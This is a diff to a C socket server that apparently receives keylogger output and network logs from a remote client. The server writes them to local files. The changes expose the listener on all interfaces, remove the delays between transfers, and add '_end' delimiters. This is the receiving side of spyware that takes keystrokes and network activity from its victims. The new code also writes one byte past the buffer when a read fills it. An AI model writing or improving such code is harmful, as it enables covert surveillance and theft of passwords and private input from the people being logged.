@@ -6,7 +6,9 @@
 #include <unistd.h>       // write
 #include <fcntl.h>
 
-#define BUFFER_SIZE 4096
+#define BUFFER_SIZE 2000
+
+int ends_with(const char *str, const char *suffix);
 
 int main()
 {
@@ -27,7 +29,7 @@ int main()
     // Set the server ip address, connection family and port. INADDR_ANY means
     // all the ip addresses of the server can be used to set up connection.
     server.sin_family      = AF_INET;
-    server.sin_addr.s_addr = inet_addr("127.0.0.1");
+    server.sin_addr.s_addr = INADDR_ANY/*inet_addr("127.0.0.1")*/;
     server.sin_port        = htons(port);
     
     // Bind the socket for the connection
@@ -55,24 +57,47 @@ int main()
     printf("Connection accepted\n");
     
     /*** Reading from Client and writing to local files* ***/
+    ssize_t read_size;
     while(1){
-        sleep(180); //wait for the client to execute again
         memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
         /*Open keylog files for printing*/
-        FILE *keylog_log = fopen("log/keylog_received.txt", "a");
+        FILE *keylog_log = fopen("./keylog_received.txt", "a");
+        setbuf(keylog_log, NULL);
         /*Receive a keylog file from the client*/
-        while(read(csock, rec_buffer, sizeof(rec_buffer)) >0 ) {
-            fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), keylog_log);
+        while((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
+            rec_buffer[read_size] = '\0';
+            char* trimmed;
+            if ((trimmed = strstr(rec_buffer, "_end")) != NULL)
+            {
+                rec_buffer[trimmed - rec_buffer] = '\0';
+                read_size = trimmed - rec_buffer;
+            }
+
+            fwrite(rec_buffer, sizeof(char), read_size, keylog_log);
+
+            if (trimmed != NULL)
+                break;
         }
         fclose(keylog_log);
-        sleep(5);
-        
+
         memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
         /*Open network log file for printing*/
-        FILE *network_log = fopen("log/network_received.txt", "a");
+        FILE *network_log = fopen("./network_received.txt", "a");
+        setbuf(network_log, NULL);
         /*Receive network log file*/
-        while(read(csock, rec_buffer, sizeof(rec_buffer)) >0 ){
-            fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), network_log);
+        while((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0){
+            rec_buffer[read_size] = '\0';
+            char* trimmed;
+            if ((trimmed = strstr(rec_buffer, "_end")) != NULL)
+            {
+                rec_buffer[trimmed - rec_buffer] = '\0';
+                read_size = trimmed - rec_buffer;
+            }
+
+            fwrite(rec_buffer, sizeof(char), read_size, network_log);
+
+            if (trimmed != NULL)
+                break;
         }
         fclose(network_log);
         
